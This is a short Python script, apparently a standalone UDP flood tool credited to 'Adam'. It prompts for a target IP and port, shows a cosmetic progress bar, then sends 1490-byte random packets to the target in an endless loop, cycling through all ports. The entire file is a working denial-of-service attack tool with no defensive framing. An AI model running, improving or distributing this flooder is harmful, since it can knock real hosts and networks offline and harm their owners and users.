import os
import time
import socket
import random
from datetime import datetime
from colorama import init, Fore

init()  # Initialiser colorama

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

print(Fore.GREEN + "Author   : Adam🇩🇿")

ip = input(Fore.LIGHTMAGENTA_EX + "IP Target: ")
port = int(input("Port: "))

print(Fore.LIGHTRED_EX + "[===============] 0% ")
time.sleep(1)
print(Fore.GREEN + "[====================] 25%")
time.sleep(1)
print(Fore.LIGHTGREEN_EX + "[=========================] 50%")
time.sleep(1)
print(Fore.LIGHTBLUE_EX + "[==============================] 100%")
time.sleep(2)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print(Fore.LIGHTMAGENTA_EX + "Sent {} packet{} through port: {}".format(sent, ip, port))
    if port == 65534:
        port = 1
